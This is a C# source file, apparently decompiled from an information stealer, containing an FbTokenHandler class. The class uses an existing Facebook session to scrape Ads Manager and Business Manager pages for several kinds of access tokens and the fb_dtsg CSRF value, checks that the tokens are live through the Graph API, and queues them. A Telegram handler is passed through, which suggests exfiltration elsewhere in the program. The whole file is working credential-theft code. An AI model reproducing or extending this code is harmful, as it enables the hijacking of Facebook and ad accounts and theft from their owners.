using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;

namespace DataExtractor.Core.Handlers.Fb;

internal class FbTokenHandler
{
	private class AnotherInfo
	{
		public HttpClient HttpClient { get; internal set; }

		public FbData FbData { get; internal set; }

		public TelegramHandler TelegramHandler { get; internal set; }
	}

	public bool CheckLive(FbData data, HttpClient httpClient)
	{
		string token = data.GetToken();
		if (token == null)
		{
			return false;
		}
		string url = "https://graph.facebook.com/v14.0/me?access_token=" + token;
		string @string = httpClient.GetString(url);
		if (string.IsNullOrEmpty(@string))
		{
			return false;
		}
		if (@string.Contains(data.UserId))
		{
			return true;
		}
		return false;
	}

	private string GetTokenPowerEditor(AnotherInfo anotherInfo)
	{
		string url = "https://www.facebook.com/adsmanager/manage/campaigns";
		string @string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text = @string.CutString("campaigns?act=", "&");
		if (string.IsNullOrEmpty(text))
		{
			anotherInfo.FbData.Log("no account id power editor");
			return null;
		}
		url = "https://www.facebook.com/adsmanager/manage/campaigns?act=" + text;
		@string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text2 = @string.CutString("EAAB", "\"");
		if (string.IsNullOrEmpty(text2))
		{
			anotherInfo.FbData.Log("no token");
			return null;
		}
		return "EAAB" + text2;
	}

	private string GetTokenEAAS(AnotherInfo anotherInfo)
	{
		anotherInfo.FbData.Log("GET TOKEN EAAS");
		string url = "https://business.facebook.com/traffic-analysis/?nav_source=flyout_menu";
		try
		{
			string @string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
			{
				{ "Sec-Fetch-Dest", "document" },
				{ "Sec-Fetch-Mode", "navigate" }
			});
			url = @string.CutString("flyout_menu&business_id=", "\"");
			if (string.IsNullOrEmpty(url))
			{
				return null;
			}
			url = "https://business.facebook.com/traffic-analysis/?nav_source=flyout_menu&business_id=" + url;
			@string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
			{
				{ "Sec-Fetch-Dest", "document" },
				{ "Sec-Fetch-Mode", "navigate" }
			});
			string text = @string.CutString("EAAS", "\"");
			if (string.IsNullOrEmpty(text))
			{
				return null;
			}
			return "EAAS" + text;
		}
		catch
		{
			return null;
		}
	}

	private string GetTokenEAAI(AnotherInfo anotherInfo)
	{
		anotherInfo.FbData.Log("GET TOKEN EAAI");
		string url = "https://www.facebook.com/ads/manager/account_settings";
		try
		{
			string @string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
			{
				{ "Sec-Fetch-Dest", "document" },
				{ "Sec-Fetch-Mode", "navigate" }
			});
			string text = @string.CutString("access_token:\"", "\"");
			anotherInfo.FbData.Fbdtsg = @string.CutString("[\"DTSGInitialData\",[],{\"token\":\"", "\"");
			if (string.IsNullOrEmpty(text))
			{
				return null;
			}
			return text;
		}
		catch
		{
			return null;
		}
	}

	internal string GetTokenPowerEdit(HttpClient httpClient, string accountId, FbData fbData)
	{
		fbData.Log("get token power edit");
		string url = "https://www.facebook.com/adsmanager/manage/campaigns?act=" + accountId;
		string @string = httpClient.GetString(url, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text = @string.CutString("EAAB", "\"");
		if (string.IsNullOrEmpty(text))
		{
			fbData.Log("no token");
			return null;
		}
		return "EAAB" + text;
	}

	private string GetTokenEAAQ(AnotherInfo anotherInfo)
	{
		anotherInfo.FbData.Log("Get Token EAAQ");
		string url = "https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsLWIDescribeCustomersContainer.react";
		string text = "";
		try
		{
			string @string = anotherInfo.HttpClient.GetString(url, new Dictionary<string, string>
			{
				{ "Sec-Fetch-Dest", "document" },
				{ "Sec-Fetch-Mode", "navigate" }
			});
			string text2 = @string.CutString("EAAQ", "\"");
			text = @string.CutString("[\"DTSGInitialData\",[],{\"token\":\"", "\"");
			if (string.IsNullOrEmpty(text2))
			{
				return null;
			}
			anotherInfo.FbData.Fbdtsg = text;
			return "EAAQ" + text2;
		}
		catch
		{
			return null;
		}
	}

	private string GetTokenByLocationEAAG(AnotherInfo anotherInfo)
	{
		if (anotherInfo.FbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG")) != null)
		{
			return "";
		}
		anotherInfo.FbData.Log("get token EAAG by https://business.facebook.com/business_locations/?nav_source=mega_menu");
		string @string = anotherInfo.HttpClient.GetString("https://business.facebook.com/business_locations/?nav_source=mega_menu", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text = @string.CutString("EAAG", "\"");
		anotherInfo.FbData.Log("EAAG token " + text);
		if (string.IsNullOrEmpty(text))
		{
			return text;
		}
		return "EAAG" + text;
	}

	public bool GetToken(HttpClient httpClient, FbData fbData, TelegramHandler telegramHandler)
	{
		fbData.FbToken = new FbToken();
		AnotherInfo arg = new AnotherInfo
		{
			HttpClient = httpClient,
			FbData = fbData,
			TelegramHandler = telegramHandler
		};
		List<Func<AnotherInfo, string>> list = new List<Func<AnotherInfo, string>> { GetTokenEAAA, GetTokenEAAGBySettingPeople, GetTokenPowerEditor, GetTokenEAAQ };
		foreach (Func<AnotherInfo, string> item in list)
		{
			try
			{
				string text = item(arg);
				if (!string.IsNullOrEmpty(text))
				{
					fbData.FbToken.Tokens.Enqueue(text);
				}
			}
			catch (Exception ex)
			{
				fbData.Log(ex.ToString());
			}
		}
		if (fbData.FbToken.Tokens.Count == 0)
		{
			return false;
		}
		return true;
	}

	private string GetTokenEAAA(AnotherInfo anotherInfo)
	{
		return new GetNewTokanFbHandler().Get(anotherInfo.HttpClient, anotherInfo.FbData);
	}

	private string GetTokenEAAGBySettingPeople(AnotherInfo anotherInfo)
	{
		anotherInfo.FbData.Log("get token EAAG by https://business.facebook.com/settings/people");
		if (anotherInfo.FbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG")) != null)
		{
			anotherInfo.FbData.Log("Da co san token");
			return "";
		}
		string @string = anotherInfo.HttpClient.GetString("https://business.facebook.com/settings/people", new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text = @string.CutString("?business_id=", "\"");
		anotherInfo.FbData.Log("result " + text);
		if (string.IsNullOrEmpty(text))
		{
			anotherInfo.FbData.Log("ko vao dc");
			return "";
		}
		@string = anotherInfo.HttpClient.GetString("https://business.facebook.com/settings/people?business_id=" + text, new Dictionary<string, string>
		{
			{ "Sec-Fetch-Dest", "document" },
			{ "Sec-Fetch-Mode", "navigate" }
		});
		string text2 = @string.CutString("EAAG", "\"");
		anotherInfo.FbData.Log("EAAG token " + text2);
		if (string.IsNullOrEmpty(text2))
		{
			return text2;
		}
		return "EAAG" + text2;
	}
}
